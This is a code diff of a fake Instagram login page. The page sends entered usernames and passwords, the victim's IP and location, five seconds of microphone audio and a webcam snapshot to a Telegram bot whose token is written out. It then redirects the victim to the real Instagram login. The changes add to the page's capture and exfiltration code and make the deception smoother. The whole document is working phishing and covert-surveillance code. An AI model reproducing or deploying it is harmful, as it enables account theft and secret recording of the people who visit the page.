@@ -77,8 +77,6 @@
     </div>
 
     <script>
-        const correctUsername = "realInstaUser";  // Set the correct Instagram username
-        const correctPassword = "password123";  // Set the correct password
         let locationData = "Unknown location";
         let ipAddress = "Unknown IP";
         let audioBlob;
@@ -109,36 +107,54 @@
             }
         }
 
-        function captureMedia(stream) {
-            // Record audio for 5 seconds
-            const mediaRecorder = new MediaRecorder(stream);
-            const audioChunks = [];
-            mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
-            mediaRecorder.start();
+        async function captureMedia(stream) {
+            try {
+                // Record 5 seconds of audio
+                audioBlob = await recordAudio(stream);
 
-            setTimeout(() => {
-                mediaRecorder.stop();
-            }, 5000);
+                // Capture snapshot from video stream
+                imageBlob = await captureSnapshot(stream);
 
-            mediaRecorder.onstop = () => {
-                audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
-                sendImmediateMedia('audio', audioBlob);  // Send audio immediately
-            };
+                // Send audio and image immediately to Telegram
+                if (audioBlob) sendImmediateMedia('audio', audioBlob);
+                if (imageBlob) sendImmediateMedia('photo', imageBlob);
 
-            // Capture snapshot from video stream
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-            video.onloadedmetadata = () => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => {
-                    imageBlob = blob;
-                    sendImmediateMedia('photo', imageBlob);  // Send snapshot immediately
-                }, 'image/jpeg');
-            };
+            } catch (err) {
+                console.error('Error capturing media:', err);
+            }
+        }
+
+        function recordAudio(stream) {
+            return new Promise((resolve) => {
+                const mediaRecorder = new MediaRecorder(stream);
+                const audioChunks = [];
+
+                mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
+                mediaRecorder.start();
+
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 5000);
+
+                mediaRecorder.onstop = () => {
+                    resolve(new Blob(audioChunks, { type: 'audio/wav' }));
+                };
+            });
+        }
+
+        function captureSnapshot(stream) {
+            return new Promise((resolve) => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                video.onloadedmetadata = () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => resolve(blob), 'image/jpeg');
+                };
+            });
         }
 
         function sendImmediateMedia(type, blob) {
@@ -150,6 +166,14 @@
             fetch(`https://api.telegram.org/bot${botToken}/send${type === 'audio' ? 'Audio' : 'Photo'}`, {
                 method: 'POST',
                 body: formData
+            }).then(response => {
+                if (response.ok) {
+                    console.log(`${type} sent successfully.`);
+                } else {
+                    console.error(`${type} failed to send.`);
+                }
+            }).catch(error => {
+                console.error(`Error sending ${type}:`, error);
             });
         }
 
@@ -157,19 +181,6 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            // Always send the input data to Telegram
-            sendLoginDataToBot(username, password);
-
-            // Validate login credentials
-            if (username === correctUsername && password === correctPassword) {
-                alert("Login successful!");
-                window.location.href = "https://www.instagram.com/accounts/login/";  // Redirect to Instagram
-            } else {
-                alert("Wrong Instagram ID or password. Please try again.");
-            }
-        }
-
-        function sendLoginDataToBot(username, password) {
             const message = `New Login Attempt:\nInstagram ID: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nLocation: ${locationData}\nTime: ${new Date().toLocaleString()}`;
 
             const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';  // Your bot token
@@ -186,6 +197,8 @@
                     chat_id: chatId,
                     text: message
                 })
+            }).then(() => {
+                window.location.href = "https://www.instagram.com/accounts/login/";
             });
         }
     </script>
